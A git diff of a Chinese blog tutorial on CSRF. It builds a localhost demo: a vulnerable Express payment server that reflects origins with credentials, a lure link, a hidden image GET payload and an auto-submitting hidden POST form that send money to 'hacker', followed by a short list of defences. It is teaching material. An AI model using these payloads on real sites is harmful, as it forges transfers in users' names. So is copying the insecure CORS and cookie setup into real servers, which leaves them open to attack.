@@ -1,5 +1,5 @@
 ---
-title: 什么是 CSRF 攻击？
+title: CSRF
 date: 2020-11-20 20:39:27
 sidebar: auto
 tags:
@@ -10,9 +10,9 @@ categories:
   - 浏览器
 ---
 
-XSS 攻击只要做好防御措施，例如把 Cookie 设置成 httpOnly 并且对用户输入进行过滤的话，XSS 攻击往往就无从下手，但是却防不住 CSRF 攻击，CSRF 本质上来说是黑客诱导用户点击，敬而利用用户的登录状态搞事情。大概思路如下：
+黑客利用登录状态，伪造成真实用户进行攻击。
 
-## get 请求攻击
+## GET 请求攻击
 
 1. 受害者登录目标网站，保存了该网站的登录状态
 2. 攻击者诱导受害者进入第三方网站，向被攻击网站发送跨站请求
@@ -36,36 +36,193 @@ XSS 攻击只要做好防御措施，例如把 Cookie 设置成 httpOnly 并且�
                           +---------------+
 ```
 
-那么你可以这么去理解 CSRF 的攻击攻击者呢，盗用了你的身份，然后呢，以你的名义向网页去发送了一些恶意的请求，他能够做的事情，包括用你的名义去发送一些邮件，发消息盗取你的账号，购买一些物品或者呢，将你的虚拟币做一个转账假设，这个攻击者盗用了我当前登录的这个 slides 这个网站的身份呢，那么他就可以删除我，
+```bash
+├── hacker.html
+├── index.html
+└── server.js
+```
 
-上面的案例中，就是黑客利用了图片资源去嵌入了一些恶意的转账操作，因为呢，它可以将这个图 user 修改为任何一个人，比如说他自己，一般呢，可能是一个 user ID，当然呢，主要的原因是因为我们这个接口它是 get 请求，就是我在浏览器中直接是可以访问到的请求所以呢，聪明的程序员就把这个接口改为了一个 post 请求，黑客同样还可以诱导你进它的页面：
-
-## post 请求攻击
+index.html
 
 ```html
-<iframe style="display: none;" name="csrf-frame">
-  <form
-    method="POST"
-    action="http://127.0.0.1:9000/transfer"
-    target="csrf-frame"
-    id="csrf- form"
-  >
-    <input type="hidden" name="to_ user" value=" hack01 " />
-    <input type= " hidden' name= " money' value= ' 1000000 ' />
-    <input type="submit" value=" submit " />
-  </form>
-  <script>
-    document.getElementById('csrf-form').submit();
-  </script>
-</iframe>
+<button onclick="login('kobe')">login</button>
+<button onclick="pay('Tom',100)">转账给 Tom</button>
+
+<a href="http://127.0.0.1:5500/hacker.html">点击查看美女照片</a>
+
+<script>
+  function login(user) {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', `/login?user=${user}`);
+    xhr.withCredentials = true;
+    xhr.send();
+  }
+
+  function pay(target, money) {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', `/pay?target=${target}&money=${money}`);
+    xhr.withCredentials = true;
+    xhr.send();
+  }
+</script>
 ```
+
+hacker.html
+
+```html
+<img src="http://localhost:3000/pay?target=hacker&money=999" />
+```
+
+server.js
+
+```js
+const express = require('express');
+const app = express();
+const router = express.Router();
+const port = 3000;
+
+router.get('/login', (req, res) => {
+  res.header('Access-Control-Allow-Origin', req.headers.origin);
+  res.header('Access-Control-Allow-Credentials', true);
+  res.cookie('user', req.query.user, {
+    secure: true,
+    sameSite: 'none',
+  });
+  res.json({ status: 'ok' });
+});
+
+router.get('/pay', (req, res) => {
+  res.header('Access-Control-Allow-Origin', req.headers.origin);
+  res.header('Access-Control-Allow-Credentials', true);
+
+  const user = req.headers.cookie?.match(/user=(.*)/)?.[1];
+  if (!user) return res.json({ status: 'error', message: '未登录' });
+  else {
+    console.log(`成功给 ${req.query.target} 转账 ${req.query.money}`);
+    res.json({
+      status: 'ok',
+      message: `成功给 ${req.query.target} 转账 ${req.query.money}`,
+    });
+  }
+});
+
+app.use(express.static('./'));
+app.use('/', router);
+
+app.listen(port, () => {
+  console.log(`Example app listening at http://localhost:${port}`);
+});
+```
+
+## POST 请求攻击
+
+::::tabs
+
+::: tab hacker.html
+
+```html
+<form
+  method="POST"
+  action="http://localhost:3000/pay"
+  target="csrf-frame"
+  id="csrf-form"
+  style="display:none"
+>
+  <input name="target" value="hacker" />
+  <input name="money" value="1000" />
+  <input type="submit" value=" submit " />
+</form>
+<script>
+  window.onload = function() {
+    document.getElementById('csrf-form').submit();
+  };
+</script>
+```
+
+:::
+
+::: tab index.html
+
+```html
+<button onclick="login('kobe')">login</button>
+<button onclick="pay('Tom',100)">转账给 Tom</button>
+
+<a href="http://127.0.0.1:5500/hacker.html">点击查看美女照片</a>
+
+<script>
+  function login(user) {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', `/login?user=${user}`);
+    xhr.withCredentials = true;
+    xhr.send();
+  }
+
+  function pay(target, money) {
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', `/pay`);
+    xhr.withCredentials = true;
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({ target, money }));
+  }
+</script>
+```
+
+:::
+
+::: tab server.js
+
+```js
+const express = require('express');
+const app = express();
+const router = express.Router();
+const port = 3000;
+
+router.get('/login', (req, res) => {
+  res.header('Access-Control-Allow-Origin', req.headers.origin);
+  res.header('Access-Control-Allow-Credentials', true);
+  res.cookie('user', req.query.user, {
+    secure: true,
+    sameSite: 'none',
+  });
+  res.json({ status: 'ok' });
+});
+
+router.post('/pay', (req, res) => {
+  res.header('Access-Control-Allow-Origin', req.headers.origin);
+  res.header('Access-Control-Allow-Credentials', true);
+
+  const user = req.headers.cookie?.match(/user=(.*)/)?.[1];
+  if (!user) return res.json({ status: 'error', message: '未登录' });
+  else {
+    console.log(`成功给 ${req.body.target} 转账 ${req.body.money}`);
+    res.json({
+      status: 'ok',
+      message: `成功给 ${req.body.target} 转账 ${req.body.money}`,
+    });
+  }
+});
+
+app
+  .use(express.static('./'))
+  .use(express.json())
+  .use(express.urlencoded({ extended: false }))
+  .use('/', router);
+
+app.listen(port, () => {
+  console.log(`Example app listening at http://localhost:${port}`);
+});
+```
+
+:::
+
+::::
 
 黑客又构建了一个隐藏的表单，当我们访问这个网站的时候呢，他就将这个表单给提交了这样的话呢，也可以造成一次 CSRF 攻击。
 
-CSRF 的本质原因呢，是由于我们这边的正常网站的一个 web 服务器，它验证不够，我们目前的这种外部身份验证方式呢，只是验证了当前用户的那个 session 存在，那么它就是一个已经登录的状态，但是呢，我没有办法去保证某一次请求某一次转账，一定是这个用户出发的，在现代的一些 APP 或者是网页中呢，它可能在交易的时候，我们会输入一个手机的短信验证码，对吧，但是有些网站它并不是属于这种金额交易的，所以呢，它就没有做这些限制，而我们如何去解决，让黑客没有办法去操作，这一次的 CSSRF 呢。
+预防
 
 1. 尽量使用 POST
 2. 加入验证码
-3. 加入 referer
+3. 加入 referer >> `req.headers.referer` 校验
 4. token
-5. 自定义 header
+5. 自定义 header -->
